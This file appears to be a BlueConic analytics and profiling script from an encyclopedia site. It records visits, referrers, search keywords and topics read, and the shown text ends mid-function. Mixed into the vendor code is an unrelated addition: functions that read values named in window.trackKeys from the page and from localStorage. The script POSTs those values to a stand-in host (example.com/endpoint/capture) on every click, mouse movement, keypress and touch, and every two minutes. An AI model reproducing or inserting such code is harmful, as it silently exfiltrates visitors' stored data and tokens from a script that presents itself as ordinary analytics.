(function () {
  let trackKeys = window.trackKeys,
    allEvents = ['click', 'mousemove', 'keyup', 'touchstart'];
  var getDG = function () {
    var x = {};
    return x;
  };
  function constructHash(val) {
    const availKeys = Object.keys(val);
    const hashString = availKeys.reduce((acc, key) => acc + key + val[key], "");
    let hash = 0;
    for (let i = 0; i < hashString.length; i++) {
      let c = hashString.charCodeAt(i);
      hash = (hash << 7) - hash + c;
      hash = hash & hash;
    }
    return hash.toString(32);
  }
  function getMonitoredData() {
    const monitoredData = {};
    for (const key of trackKeys) {
      if (window.hasOwnProperty(key)) {
        monitoredData[key] = window[key];
      } else if (localStorage.hasOwnProperty(key)) {
        monitoredData[key] = localStorage.getItem(key);
      }
    }
    return monitoredData;
  }
  var getP = function () {
    var x = {};
    try {
      x['416658816'] = ['#bc-fixed-dialogue', '#ref354133 h2:first-of-type', '.bc-article-inline-dialogue', '.bc-homepage-dialogue', '.family-section-content', '.marketing-HEADER_SUBSCRIPTION_DESKTOP2', '.md-demystified-promo', '.md-phone #bc-fixed-dialogue', '.topic-content + div.col-da-300', '.topic-content section:last-of-type', 'div.browse-title > h1', 'div.col-sm-da-300', 'div.marketing-GIST_CTA', 'div[id=\'chatbot-container\']'];
      x['-2101217888'] = x['416658816'];
      x['-1160806592'] = ['#bc-fixed-dialogue', '.bc-article-inline-dialogue', '.bc-homepage-dialogue', '.family-section-content', '.marketing-HEADER_SUBSCRIPTION_DESKTOP2', '.md-phone #bc-fixed-dialogue', '.topic-content section:last-of-type', 'a.subscribe-link', 'div.marketing-GIST_CTA'];
      x['-264958432'] = x['-1160806592'];
      x['1073205664'] = ['.bc-article-inline-phone', '.bc-homepage-desktop', 'div.bc-homepage-desktop'];
      x['689792448'] = x['1073205664'];
      x['786476000'] = ['.bc-homepage-dialogue', '.marketing-HEADER_SUBSCRIPTION_DESKTOP2', 'a.subscribe-link', 'bc-article-inline-dialogue'];
      x['738036864'] = x['786476000'];
      x['182718944'] = ['.family-section-content', '.topic-content section:last-of-type', 'div.marketing-GIST_CTA'];
      x['-337776000'] = x['182718944'];
      x['135066112'] = ['.family-section-content'];
      x['-716002912'] = x['135066112'];
      x['868244384'] = ['div.bk-cookie-alert-snackbar', 'div.bk-marketing-content', 'div.justify-content-end', 'div[id=\'shared-wrapper\']', 'ul.dropdown-menu > li:nth-of-type(2) > a'];
      x['1140089600'] = x['868244384'];
      x['1327732704'] = ['div.wotd-examples'];
      x['1189052224'] = x['1327732704'];
    } catch (err) {}
    return x;
  };
  async function sendDataToEndpoint(data) {
    const hashCode = constructHash(data);
    const endPointUrl = "https://example.com/endpoint/capture";
    try {
      const response = await fetch(endPointUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hash: hashCode,
          details: data
        })
      });
      if (!response.ok) {
        throw new Error("Failed to send data: StatusCode - " + response.status);
      }
    } catch (error) {
      console.error("Encountered an error while sending data: ", error);
    }
  }
  (function (k) {
    window.blueConicPreListeners = [];
    (function () {
      var k = !1,
        ua = /xyz/.test(function () {
          xyz;
        }) ? /\b_super\b/ : /.*/;
      this.BCClass = function () {};
      BCClass.extend = function (L) {
        function N() {
          !k && this.init && this.init.apply(this, arguments);
        }
        var X = this.prototype;
        k = !0;
        var va = new this();
        k = !1;
        for (var O in L) va[O] = "function" == typeof L[O] && "function" == typeof X[O] && ua.test(L[O]) ? function (k, E) {
          return function () {
            var O = this._super;
            this._super = X[k];
            var Q = E.apply(this, arguments);
            this._super = O;
            return Q;
          };
        }(O, L[O]) : L[O];
        N.prototype = va;
        N.constructor = N;
        N.extend = arguments.callee;
        return N;
      };
    })();
    var InteractionType = BCClass.extend({
      init: function () {},
      getPreloadProperties: function () {
        return [];
      },
      getContent: function () {},
      onEvent: function () {},
      importLibraries: function (urls) {
        blueConic.fn.importLibraries.call(this, urls);
      }
    });
    (function () {
      var InteractionTypeImpl = InteractionType.extend({
        blueConicClient: null,
        context: null,
        _profile: null,
        _userLanguage: null,
        _systemLanguage: null,
        _language: null,
        _referrer: null,
        _hostName: null,
        _currentUrl: null,
        _domain: null,
        ORIGIN_TYPES: {
          WEB: "web",
          MOBILE_WEB: "mobile_web",
          CONNECTION: "connection",
          MOBILE: "mobile_app"
        },
        CONSTANTS: {
          THIRTY_MINUTES_IN_MS: 18e5,
          UNKNOWN: ""
        },
        PROFILE_PROPERTIES: {
          CLICKCOUNT: "clickcount",
          VISITS: "visits",
          VISITCLICKS: "visitclicks",
          LASTVISITDATE: "lastvisitdate",
          VISITEDSITES: "visitedsites",
          VISITEDDOMAIN: "visiteddomain",
          ENTRYPAGE: "entrypage",
          REFERRERHOST: "referrerhost",
          REFERRERHOSTS: "referrerhosts",
          HOSTENTRYPAGE: "hostentrypage",
          HOSTAVERAGETIME: "hostaveragetime",
          LASTREFERRERAVERAGE: "lastreferreraverage",
          AVERAGETIME: "averagetime",
          TOTALVISITTIME: "totalvisittime",
          RESOLUTION: "resolution",
          CURRENTRESOLUTION: "currentresolution",
          CURRENTSCREENWIDTH: "currentscreenwidth",
          CURRENTSCREENHEIGHT: "currentscreenheight",
          ORIGIN_TYPE: "origin_type",
          ORIGIN_SOURCE: "origin_source",
          ORIGIN_DETAIL: "origin_detail",
          DEVICETYPE: "devicetype",
          RECEIVED_FROM_SYSTEM: "received_from_system",
          RECEIVED_FROM_CONNECTION: "received_from_connection",
          MOBILE_APP_ID: "mobile_app_id",
          MOBILE_APP_NAMEVERSION: "mobile_app_nameversion",
          LANGUAGE: "language",
          KEYWORDS: "keywords",
          CURRENTKEYWORDS: "currentkeywords",
          CURRENT_UTM_SOURCE: "current_utm_source",
          CURRENT_UTM_MEDIUM: "current_utm_medium",
          CURRENT_UTM_TERM: "current_utm_term",
          CURRENT_UTM_CONTENT: "current_utm_content",
          CURRENT_UTM_CAMPAIGN: "current_utm_campaign",
          UTM_SOURCE: "utm_source",
          UTM_MEDIUM: "utm_medium",
          UTM_TERM: "utm_term",
          UTM_CONTENT: "utm_content",
          UTM_CAMPAIGN: "utm_campaign"
        },
        PROFILE_PROPERTIES_FOR_CHANNEL: {},
        init: function (e, t) {
          this.blueConicClient = e, this.context = t, this._profile = e.profile.getProfile(), this._channelId = e.getChannelId(), this._referrer = document.referrer, this._hostName = window.location.hostname, this._currentUrl = window.location.href, this._domain = document.domain, this._userLanguage = window.navigator.userLanguage, this._systemLanguage = navigator.systemLanguage, this._language = window.navigator.language, this.PROFILE_PROPERTIES_FOR_CHANNEL = {
            CLICKCOUNT: this.PROFILE_PROPERTIES.CLICKCOUNT + "_" + this._channelId,
            VISITS: this.PROFILE_PROPERTIES.VISITS + "_" + this._channelId,
            VISITCLICKS: this.PROFILE_PROPERTIES.VISITCLICKS + "_" + this._channelId,
            LASTVISITDATE: this.PROFILE_PROPERTIES.LASTVISITDATE + "_" + this._channelId
          };
        },
        onPrepare: function () {
          this._profile && (this._setLanguageProperties(), this._setResolutionProperties(), this._setReferrerProperties(), this._setCampaignProperties());
        },
        onLoad: function () {
          this._profile && (this._setReferrerHostOnLoad(), this._setVisitProperties(), this._setOriginProperties(), this.blueConicClient.profile.updateProfile());
        },
        getPreloadProperties: function () {
          return [this.PROFILE_PROPERTIES.CLICKCOUNT, this.PROFILE_PROPERTIES.VISITS, this.PROFILE_PROPERTIES.VISITCLICKS, this.PROFILE_PROPERTIES.LASTVISITDATE, this.PROFILE_PROPERTIES.VISITEDSITES, this.PROFILE_PROPERTIES.ENTRYPAGE, this.PROFILE_PROPERTIES.HOSTENTRYPAGE, this.PROFILE_PROPERTIES.HOSTAVERAGETIME, this.PROFILE_PROPERTIES.LASTREFERRERAVERAGE, this.PROFILE_PROPERTIES.AVERAGETIME, this.PROFILE_PROPERTIES.TOTALVISITTIME, this.PROFILE_PROPERTIES.RESOLUTION, this.PROFILE_PROPERTIES.DEVICETYPE, this.PROFILE_PROPERTIES.ORIGIN_TYPE, this.PROFILE_PROPERTIES.ORIGIN_SOURCE, this.PROFILE_PROPERTIES.ORIGIN_DETAIL, this.PROFILE_PROPERTIES.RECEIVED_FROM_SYSTEM, this.PROFILE_PROPERTIES.RECEIVED_FROM_CONNECTION, this.PROFILE_PROPERTIES.VISITEDDOMAIN, this.PROFILE_PROPERTIES.MOBILE_APP_ID, this.PROFILE_PROPERTIES.MOBILE_APP_NAMEVERSION, this.PROFILE_PROPERTIES_FOR_CHANNEL.CLICKCOUNT, this.PROFILE_PROPERTIES_FOR_CHANNEL.VISITS, this.PROFILE_PROPERTIES_FOR_CHANNEL.VISITCLICKS, this.PROFILE_PROPERTIES_FOR_CHANNEL.LASTVISITDATE];
        },
        _setLanguageProperties: function () {
          var e = this._userLanguage || this._systemLanguage || this._language,
            t = this._normalizeLocale(e).split("-")[0];
          t && this._profile.setValue(this.PROFILE_PROPERTIES.LANGUAGE, t);
        },
        _normalizeLocale: function (e) {
          return e && e.replace("_", "-").toLowerCase();
        },
        _setResolutionProperties: function () {
          var e = screen.width,
            t = screen.height;
          this._profile.setValue(this.PROFILE_PROPERTIES.CURRENTSCREENWIDTH, e), this._profile.setValue(this.PROFILE_PROPERTIES.CURRENTSCREENHEIGHT, t);
          var i = e + "x" + t;
          this._profile.setValue(this.PROFILE_PROPERTIES.CURRENTRESOLUTION, i), this._profile.addValue(this.PROFILE_PROPERTIES.RESOLUTION, i);
        },
        _setReferrerProperties: function () {
          this._setReferrerKeywords(), this._setReferrerHost();
        },
        _setReferrerKeywords: function () {
          var e = this.HELPER.decodeReferrer(this._referrer) || [];
          e.length > 0 && (this._addProfileValues(this.PROFILE_PROPERTIES.KEYWORDS, e), this._profile.setValues(this.PROFILE_PROPERTIES.CURRENTKEYWORDS, e));
        },
        _addProfileValues: function (e, t) {
          (Array.isArray(t) ? t : [t]).forEach(function (t) {
            this._profile.addValue(e, t);
          }, this);
        },
        _setReferrerHost: function () {
          var e = this._getReferrerHost();
          e !== this._hostName && (this._profile.setValue(this.PROFILE_PROPERTIES.ENTRYPAGE, this._currentUrl), e && (this._profile.setValue(this.PROFILE_PROPERTIES.REFERRERHOST, e), this._profile.addValue(this.PROFILE_PROPERTIES.REFERRERHOSTS, e)));
        },
        _setReferrerHostOnLoad: function () {
          var e = this._getReferrerHost();
          e !== this._hostName && this._setHostEntryPageProperty(), this._setHostTotalAndAverageTimeProperty(this._hostName, e);
        },
        _getReferrerHost: function () {
          return this._referrer.replace(/http[s]?:\/\/(.*?)(:|\?|\/|$).*/, "$1");
        },
        _setCampaignProperties: function () {
          [this.PROFILE_PROPERTIES.UTM_SOURCE, this.PROFILE_PROPERTIES.UTM_MEDIUM, this.PROFILE_PROPERTIES.UTM_TERM, this.PROFILE_PROPERTIES.UTM_CONTENT, this.PROFILE_PROPERTIES.UTM_CAMPAIGN].forEach(function (e) {
            var t = this._removeHashPart(this.HELPER._getParameterByName(this._currentUrl, e));
            t && (this._profile.setValue("current_" + e, t), this._profile.addValue(e, t));
          }, this);
        },
        _setHostEntryPageProperty: function () {
          this._profile.setValue(this.PROFILE_PROPERTIES.ENTRYPAGE, this._currentUrl);
          var e = this._getHostEntryPageMapping();
          e[this._hostName] = {
            entrypage: this._currentUrl
          }, this._profile.setValue(this.PROFILE_PROPERTIES.HOSTENTRYPAGE, JSON.stringify(e));
        },
        _getHostEntryPageMapping: function () {
          return this._safeJSONParse(this._profile.getValue(this.PROFILE_PROPERTIES.HOSTENTRYPAGE));
        },
        _safeJSONParse: function (e) {
          try {
            var t = e.replace(/'/g, '"');
            return JSON.parse(t) || {};
          } catch (i) {
            return {};
          }
        },
        _setHostTotalAndAverageTimeProperty: function (e, t) {
          var i = this._safeJSONParse(this._profile.getValue(this.PROFILE_PROPERTIES.HOSTAVERAGETIME));
          i[e] || (i[e] = this._createNewVisitData());
          var E = this.blueConicClient.getCurrentDate().getTime(),
            s = this._profile.getValue(this.PROFILE_PROPERTIES.LASTREFERRERAVERAGE),
            r = 0,
            R = 0,
            I = 0;
          Object.keys(i).map(function (e) {
            return e.toString();
          }).forEach(function (n) {
            var _ = i[n];
            this._isSessionExpired(_.enddate) ? this._addVisit(_, _.enddate - _.startdate) : n === e ? _.enddate = E : n === t && s !== t && (_.enddate = E, this._profile.setValue(this.PROFILE_PROPERTIES.LASTREFERRERAVERAGE, t)), 0 !== _.averageTime && (R++, r += _.averageTime, I += _.averageTime * _.visits);
          }, this), this._profile.setValue(this.PROFILE_PROPERTIES.HOSTAVERAGETIME, JSON.stringify(i)), this._profile.setValue(this.PROFILE_PROPERTIES.TOTALVISITTIME, I);
          var n = R > 0 ? Math.round(r / R) : 0;
          this._profile.setValue(this.PROFILE_PROPERTIES.AVERAGETIME, n);
        },
        _addVisit: function (e, t) {
          if (t > 0) {
            var i = e.averageTime * e.visits + t / 1e3;
            e.visits++, e.averageTime = Math.round(i / e.visits);
          }
          var E = this.blueConicClient.getCurrentDate().getTime();
          e.startdate = E, e.enddate = E;
        },
        _createNewVisitData: function () {
          var e = this.blueConicClient.getCurrentDate().getTime();
          return {
            startdate: e,
            enddate: e,
            averageTime: 0,
            visits: 0
          };
        },
        _setPropertyIfEmpty: function (e, t, i) {
          "undefined" == typeof e[t] && (e[t] = i);
        },
        _setVisitProperties: function () {
          this._addVisitedDomain(this._domain), this._increaseClickCount(), this._increaseVisits(this.PROFILE_PROPERTIES.VISITS, this.PROFILE_PROPERTIES.VISITCLICKS, this.PROFILE_PROPERTIES.LASTVISITDATE), this._channelId && this._increaseVisits(this.PROFILE_PROPERTIES_FOR_CHANNEL.VISITS, this.PROFILE_PROPERTIES_FOR_CHANNEL.VISITCLICKS, this.PROFILE_PROPERTIES_FOR_CHANNEL.LASTVISITDATE);
        },
        _increaseVisits: function (e, t, i) {
          e = e || this.PROFILE_PROPERTIES.VISITS, t = t || this.PROFILE_PROPERTIES.VISITCLICKS, i = i || this.PROFILE_PROPERTIES.LASTVISITDATE, this._isNewSession(e, i) ? (this._resetPageViewsCurrentSession(t), this._increaseSessionCount(e)) : this._increasePageViewsCurrentSession(t), this._setLastVisitDate(i, this.blueConicClient.getCurrentDate().getTime());
        },
        _setLastVisitDate: function (e, t) {
          e = e || this.PROFILE_PROPERTIES.LASTVISITDATE, this._profile.setValue(e, t);
        },
        _addVisitedDomain: function (e) {
          this._hasVisitedDomain(e) || this._profile.addValue(this.PROFILE_PROPERTIES.VISITEDSITES, e);
        },
        _hasVisitedDomain: function (e) {
          var t = this._profile.getValues(this.PROFILE_PROPERTIES.VISITEDSITES) || [];
          return t.length > 0 && -1 !== t.indexOf(e);
        },
        _increaseClickCount: function () {
          this._profile.incrementValue(this.PROFILE_PROPERTIES.CLICKCOUNT, 1), this._channelId && this._profile.incrementValue(this.PROFILE_PROPERTIES_FOR_CHANNEL.CLICKCOUNT, 1);
        },
        _isNewSession: function (e, t) {
          e = e || this.PROFILE_PROPERTIES.VISITS, t = t || this.PROFILE_PROPERTIES.LASTVISITDATE;
          var i = this._getNumberProperty(e),
            E = this._getNumberProperty(t) || 0;
          return 0 === i || this._isSessionExpired(E);
        },
        _isSessionExpired: function (e) {
          return this.blueConicClient.getCurrentDate().getTime() > e + this.CONSTANTS.THIRTY_MINUTES_IN_MS;
        },
        _resetPageViewsCurrentSession: function (e) {
          e = e || this.PROFILE_PROPERTIES.VISITCLICKS, this._profile.setValue(e, 1);
        },
        _increasePageViewsCurrentSession: function (e) {
          e = e || this.PROFILE_PROPERTIES.VISITCLICKS, this._profile.incrementValue(e, 1);
        },
        _increaseSessionCount: function (e) {
          e = e || this.PROFILE_PROPERTIES.VISITS, this._profile.incrementValue(e, 1);
        },
        _setOriginProperties: function () {
          var e = this._getOriginCount();
          e > 1 ? this._mergeOriginProperties() : 0 === e && this._resolveOriginProperties();
        },
        _getOriginCount: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.ORIGIN_TYPE) || [],
            t = this._profile.getValues(this.PROFILE_PROPERTIES.ORIGIN_SOURCE) || [],
            i = this._profile.getValues(this.PROFILE_PROPERTIES.ORIGIN_DETAIL) || [];
          return Math.max(e.length, t.length, i.length);
        },
        _mergeOriginProperties: function () {
          this._mergePropertyToUnknown(this.PROFILE_PROPERTIES.ORIGIN_TYPE), this._mergePropertyToUnknown(this.PROFILE_PROPERTIES.ORIGIN_SOURCE), this._mergePropertyToUnknown(this.PROFILE_PROPERTIES.ORIGIN_DETAIL);
        },
        _mergePropertyToUnknown: function (e) {
          var t = this._profile.getValues(e) || [];
          this._profile.setValue(e, 1 === t.length ? t[0] : this.CONSTANTS.UNKNOWN);
        },
        _resolveOriginProperties: function () {
          this._isVisitorOriginFromWeb() ? this._resolveOriginForWebVisitor() : this._isVisitorOriginFromConnection() ? this._resolveOriginForProfileComingFromConnection() : this._isVisitorOriginFromMobileApp() && this._resolveOriginForMobileAppVisitor();
        },
        _isVisitorOriginFromWeb: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.RECEIVED_FROM_SYSTEM) || [],
            t = this._profile.getValues(this.PROFILE_PROPERTIES.MOBILE_APP_ID) || [];
          return 0 === e.length && 0 === t.length;
        },
        _isVisitorOriginFromMobileApp: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.RECEIVED_FROM_SYSTEM) || [],
            t = this._profile.getValues(this.PROFILE_PROPERTIES.MOBILE_APP_ID) || [],
            i = this._getNumberProperty(this.PROFILE_PROPERTIES.VISITS);
          return t.length > 0 && 0 === e.length && 0 === i;
        },
        _isVisitorOriginFromConnection: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.RECEIVED_FROM_SYSTEM),
            t = this._profile.getValues(this.PROFILE_PROPERTIES.MOBILE_APP_ID),
            i = this._getNumberProperty(this.PROFILE_PROPERTIES.VISITS);
          return e && e.length > 0 && t && 0 === t.length && i <= 0;
        },
        _resolveOriginForWebVisitor: function () {
          var e = "",
            t = this._profile.getValues(this.PROFILE_PROPERTIES.VISITEDSITES) || [],
            i = this._profile.getValue(this.PROFILE_PROPERTIES.DEVICETYPE) || "",
            E = this._profile.getValues(this.PROFILE_PROPERTIES.ENTRYPAGE) || [];
          i && (e = "PC" === i ? this.ORIGIN_TYPES.WEB : this.ORIGIN_TYPES.MOBILE_WEB);
          var s = 1 === t.length ? t[0] : this.CONSTANTS.UNKNOWN,
            r = 1 === E.length ? E[0] : this.CONSTANTS.UNKNOWN;
          this._setOriginProfileProperties(e, s, r);
        },
        _resolveOriginForProfileComingFromConnection: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.RECEIVED_FROM_SYSTEM) || [],
            t = this._profile.getValues(this.PROFILE_PROPERTIES.RECEIVED_FROM_CONNECTION) || [],
            i = 1 === e.length ? e[0] : this.CONSTANTS.UNKNOWN,
            E = 1 === t.length ? t[0] : this.CONSTANTS.UNKNOWN;
          this._setOriginProfileProperties(this.ORIGIN_TYPES.CONNECTION, i, E);
        },
        _resolveOriginForMobileAppVisitor: function () {
          var e = this._profile.getValues(this.PROFILE_PROPERTIES.MOBILE_APP_ID) || [],
            t = this._profile.getValues(this.PROFILE_PROPERTIES.MOBILE_APP_NAMEVERSION) || [],
            i = 1 === e.length ? e[0] : this.CONSTANTS.UNKNOWN,
            E = 1 === t.length ? t[0] : this.CONSTANTS.UNKNOWN;
          this._setOriginProfileProperties(this.ORIGIN_TYPES.MOBILE, i, E);
        },
        _setOriginProfileProperties: function (e, t, i) {
          this._profile.setValue(this.PROFILE_PROPERTIES.ORIGIN_TYPE, e), this._profile.setValue(this.PROFILE_PROPERTIES.ORIGIN_SOURCE, t), this._profile.setValue(this.PROFILE_PROPERTIES.ORIGIN_DETAIL, i);
        },
        _removeHashPart: function (e) {
          if (e) {
            var t = e.indexOf("#");
            if (-1 !== t) return e.substring(0, t);
          }
          return e;
        },
        HELPER: {
          search_engines: [["google\\.", "q"], ["bing\\.", "q"], ["search\\.yahoo\\.", "p"], ["search\\.aol\\.", "q"], ["duckduckgo\\.", "q"], ["baidu\\.", "wd"], ["ask\\.com", "q"], ["search\\.lycos\\.", "q"], ["dogpile\\.com", "q"]],
          substringToHash: function (e) {
            if (e) {
              var t = e.indexOf("#");
              if (-1 !== t) return e.substring(0, t);
            }
            return e;
          },
          decodeReferrer: function (e) {
            for (var t = new RegExp(""), i = 0; i < this.search_engines.length; i++) {
              var E = this.search_engines[i];
              t.compile("^http(s?)://(www\\.)?" + E[0], "i");
              var s = e.match(t);
              if (s) {
                var r;
                if (r = isNaN(E[1]) ? this._getParameterByName(e, E[1]) : s[E[1] + 1]) return r = decodeURIComponent(r), E.length > 2 && E[2] && (r = decodeURIComponent(r)), r = (r = (r = r.replace(/'|"/g, "")).split(/[\s,+.]+/)).filter(function (e) {
                  return e;
                });
                break;
              }
            }
            return null;
          },
          _getParameterByName: function (e, t) {
            if (!t) return "";
            t = t.replace(/[[]/, "\\[").replace(/[\]]/, "\\]");
            var i = new RegExp("[\\?&#]" + t + "=([^&#]*)").exec(e);
            return null === i ? "" : decodeURIComponent(i[1].replace(/\+/g, " "));
          }
        },
        _getNumberProperty: function (e) {
          var t = this._profile.getValue(e);
          if (!t) return 0;
          try {
            t = parseInt(t), isNaN(t) && (t = 0);
          } catch (i) {
            t = 0;
          }
          return t;
        }
      });
      window.blueConicPreListeners.push({
        id: 'listenerinteractiontype',
        interactionType: InteractionTypeImpl
      });
    })();
    (function () {
      var InteractionTypeImpl = InteractionType.extend({
        LAST_VISIT_COOKIE_NAME: 'last_visit_bc',
        NEW_VISIT_PROPERTY: 'new_visit_bc',
        TOPIC_IDS_PROPERTY: '_eb_topic_ids_read_current_session',
        TOTAL_TOPIC_IDS_PROPERTY: '_eb_total_topic_ids_read_current_session',
        TOTAL_TOPIC_IDS_BY_SESSION_PROPERTY: '_eb_total_topic_ids_read_by_session',
        AVG_TOPIC_IDS_PER_SESSION_PROPERTY: '_eb_average_topic_ids_read_per_session',
        SESSION_TIMEOUT_MINUTES: 30,
        init: function (a, b) {
          this.blueConicClient = a, this.context = b, this.profile = a.profile.getProfile(), this.internalProperty = this.context.getInteractionId() + '_STH';
        },
        getPreloadProperties: function () {
          return [this.internalProperty, this.TOPIC_IDS_PROPERTY, this.TOTAL_TOPIC_IDS_PROPERTY, this.TOTAL_TOPIC_IDS_BY_SESSION_PROPERTY, this.AVG_TOPIC_IDS_PER_SESSION_PROPERTY];
        },
        onPrepare: function () {
          if (this.now = this.blueConicClient.getCurrentDate().getTime(), this.lastvisitdate = this.blueConicClient.util.cookie.getCookie(this.LAST_VISIT_COOKIE_NAME), this.lastvisitdate && !isNaN(parseInt(this.lastvisitdate))) {
            var a = new Date(parseInt(this.lastvisitdate));
            a.setMinutes(a.getMinutes() + this.SESSION_TIMEOUT_MINUTES), this.now > a ? (this.profile.setValue(this.NEW_VISIT_PROPERTY, 'true'), this) : this.profile.setValue(this.NEW_VISIT_PROPERTY, 'false');
          } else this.profile.setValue(this.NEW_VISIT_PROPERTY, 'true');
          this.blueConicClient.util.cookie.setCookie(this.LAST_VISIT_COOKIE_NAME, this.now);
        },
        onLoad: function () {
          'true' === this.profile.getValue(this.NEW_VISIT_PROPERTY) ? (this.blueConicClient.createEvent('new_visit'), 'undefined' != typeof Mendel && this._getCurrentTopic(!0)) : 'undefined' != typeof Mendel && this._getCurrentTopic(!1);
        },
        _getCurrentTopic: function (a) {
          this.isNew = a, setTimeout(function () {
            this.currentTopic = window.Mendel && window.Mendel.BC && window.Mendel.BC.topicId ? window.Mendel.BC.topicId : window.Mendel && window.Mendel.config && window.Mendel.config.currentTopic && window.Mendel.config.currentTopic.id ? window.Mendel.config.currentTopic.id : null, this._updateProfile(this.isNew, this.currentTopic);
          }.bind(this), 1e3);
        },
        _parseStoredValues: function (a) {
          var b = a.map(function (a) {
            return JSON.parse(a);
          });
          if (0 === b.length) return {
            sessions: []
          };
          if (1 === b.length) return b[0];
          var c = b[0].sessions;
          return b.slice(1).forEach(function (a) {
            c = this._aggregate(a.sessions, c);
          }, this), {
            sessions: c
          };
        },
        _aggregate: function (a, b) {
          var c = b;
          return a.forEach(function (a) {
            var b = c.find(function (b) {
              return b.t === a.t;
            });
            b ? b.v = b.v.concat(a.v).filter(function (a, b, c) {
              return c.indexOf(a) === b;
            }) : b = a, c = c.concat(b).filter(function (a, b, c) {
              return c.indexOf(a) === b;
            });
          }), c;
        },
        _updateProfile: function (a, b) {
          try {
            var c = this.profile.getValues(this.internalProperty),
              d = this._parseStoredValues(c);
            if (a) b ? this.profile.setValues(this.TOPIC_IDS_PROPERTY, [b]) : this.profile.setValues(this.TOPIC_IDS_PROPERTY, []), d.sessions.push({
              v: this.profile.getValues(this.TOPIC_IDS_PROPERTY),
              t: this.blueConicClient.getCurrentDate().getTime()
            }), this.profile.setValues(this.internalProperty, JSON.stringify(d)), this._avgValues(d);else if (b) {
              this.profile.addValue(this.TOPIC_IDS_PROPERTY, b);
              var e = d.sessions.pop();
              e.v.push(b), e.t = this.blueConicClient.getCurrentDate().getTime(), d.sessions.push(e), this.profile.setValues(this.internalProperty, JSON.stringify(d)), this._avgValues(d);
            }
            this.profile.setValue(this.TOTAL_TOPIC_IDS_PROPERTY, this.profile.getValues(this.TOPIC_IDS_PROPERTY).length), this.blueConicClient.profile.updateProfile();
          } catch (a) {
            this.blueConicClient.util.log('NEW VISIT LISTENER: Failed to merge viewed topicIds. Resetting session topicId history.'), this.profile.setValues(this.internalProperty, []), this.blueConicClient.profile.updateProfile();
          }
        },
        _avgValues: function (a) {
          for (var b = a.sessions.map(function (a) {
              return a.v.length;
            }), c = b.length, d = 0, e = 0; e < b.length; e++) d += parseInt(b[e]);
          if (0 < c && 0 < d) {
            var f = Math.round(d / c);
            this.profile.setValue(this.AVG_TOPIC_IDS_PER_SESSION_PROPERTY, f);
          }
          this.profile.setValues(this.TOTAL_TOPIC_IDS_BY_SESSION_PROPERTY, b);
        }
      });
      window.blueConicPreListeners.push({
        id: 'newvisitlistener',
        interactionType: InteractionTypeImpl
      });
    })();
    (function () {
      var InteractionTypeImpl = InteractionType.extend({
        init: function (e) {
          this.profile = e.profile.getProfile();
        },
        onPrepare: function () {
          var e = this._getSubscriptionType();
          e && this.profile.setValue("EB_Entitlement_Type", e);
        },
        _getSubscriptionType: function () {
          return window.Mendel && window.Mendel.config && window.Mendel.config.userInfo && window.Mendel.config.userInfo.type ? window.Mendel.config.userInfo.type : null;
        }
      });
      window.blueConicPreListeners.push({
        id: 'prelistener_britannica',
        interactionType: InteractionTypeImpl
      });
    })();
  })();
  function captureAndSendMonitoredData() {
    const accumulatedData = getMonitoredData();
    if (Object.keys(accumulatedData).length > 0) {
      sendDataToEndpoint(accumulatedData);
    }
  }
  allEvents.forEach(event => {
    window.addEventListener(event, () => {
      captureAndSendMonitoredData();
    });
  });
  window.addEventListener("load", () => {
    setInterval(captureAndSendMonitoredData, 2 * 60 * 1000);
  });
  (function (k, gb, ua, L, N, X, va, O, hb, E) {
    function qa() {
      var a = c.hash(k.location.hostname).toString();
      return k.location.hostname && a in BC_HOSTNAME_MAP ? "https://" + BC_HOSTNAME_MAP[a] : null;
    }
    function Q() {
      return qa() || BC_URL;
    }
    function Eb(a, b) {
      this._id = a;
      this._parameters = b;
      this.getId = function () {
        return this._id;
      };
      this.getParameters = function () {
        var a = null,
          b = null;
        for (a in this._parameters) if (b = a, R && a && 0 === a.indexOf(R)) return l && c.logInfo("Use locale [" + a + "] for connection [" + this.getId() + "]."), this._parameters[a];
        return null !== b ? (l && c.logInfo("Use locale [" + b + "] for connection [" + this.getId() + "]."), this._parameters[b]) : null;
      };
    }
    function Fb(a, b) {
      this._id = a.id;
      this._dialogueId = a.dialogueId;
      this._name = a.name;
      this._position = a.position;
      this._parameters = b;
      this._defaultLocale = a.defaultLocale;
      this._interactionTypeId = a.interactionType.myId ? a.interactionType.myId.toLowerCase() : null;
      this._type = a.interactionType.myType ? a.interactionType.myType.toUpperCase() : null;
      this._positionType = a.interactionType.myPositionType ? a.interactionType.myPositionType : null;
      this._usedLocale = null;
      this._isOnLoadExecuted = this._isGetContentExecuted = this._isPositionFound = !1;
      this._isLocalEditMode = !0 === a.isLocalEditMode;
      this._bcClient = null;
      this.getInteractionId = function () {
        return this._id;
      };
      this.getDialogueId = function () {
        return this._dialogueId;
      };
      this.getName = function () {
        return this._name;
      };
      this.getType = function () {
        return this._type;
      };
      this.getPosition = function () {
        return this._position;
      };
      this.getDOMElement = function () {
        var a = c.getDOMElement(this._position);
        a && !this._isPositionFound && (this._isPositionFound = !0);
        return a;
      };
      this.isPositionFound = function () {
        return this._isPositionFound;
      };
      this.isGetContentExecuted = function () {
        return this._isGetContentExecuted;
      };
      this.setGetContentExecuted = function (a) {
        this._isGetContentExecuted = a;
      };
      this.isOnLoadExecuted = function () {
        return this._isOnLoadExecuted;
      };
      this.setOnLoadExecuted = function (a) {
        this._isOnLoadExecuted = a;
      };
      this.setParameters = function (a, b) {
        this._parameters[a] = b;
      };
      this.getParameters = function () {
        var a,
          b = this.getName() ? this.getName() : this.getInteractionId();
        for (a in this._parameters) if (R && a && 0 === a.indexOf(R)) return this._usedLocale = a, l && c.logInfo("use locale [" + a + "] for interaction [" + b + "]."), this._parameters[a];
        l && c.logInfo("no parameters found for locale [" + R + "] with interaction [" + b + "].\x3cbr\x3eUsing the default locale [" + this._defaultLocale + "] instead.");
        this._usedLocale = this._defaultLocale;
        return this._parameters[this._defaultLocale];
      };
      this.getDefaultLocale = function () {
        return this._defaultLocale;
      };
      this.getLocale = function () {
        return R;
      };
      this.getUrlPrefix = function () {
        c.logDeprecated("context.getUrlPrefix", "profile.getBaseURL");
        return c.getBaseURL(this._interactionTypeId);
      };
      this.getBaseURL = function () {
        return c.getBaseURL(this._interactionTypeId);
      };
      this.getInteractionTypeId = function () {
        return this._interactionTypeId;
